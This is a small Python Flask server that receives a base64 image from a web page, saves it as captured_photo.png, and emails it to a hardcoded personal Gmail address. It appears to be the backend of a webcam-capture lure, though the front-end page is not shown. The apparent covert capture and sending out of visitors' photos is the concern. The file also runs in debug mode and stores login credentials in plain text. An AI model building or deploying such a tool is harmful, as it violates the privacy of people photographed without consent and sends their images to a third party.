from flask import Flask, request, jsonify, send_from_directory
import base64
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from io import BytesIO
from PIL import Image

app = Flask(__name__)

@app.route('/')
def serve_html():
    return send_from_directory('.', 'index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    image_data = data['image'].split(',')[1]
    image = Image.open(BytesIO(base64.b64decode(image_data)))
    image_path = "captured_photo.png"
    image.save(image_path)

    # Send email
    send_email(image_path)

    return jsonify({"message": "Photo sent successfully!"})

def send_email(image_path):
    from_email = "your_email@example.com"
    from_password = "your_password"
    to_email = "hiteshsonu768@gmail.com"

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = "Captured Photo"

    part = MIMEBase('application', "octet-stream")
    part.set_payload(open(image_path, "rb").read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="captured_photo.png"')
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, from_password)
    server.sendmail(from_email, to_email, msg.as_string())
    server.quit()

if __name__ == "__main__":
    app.run(debug=True)
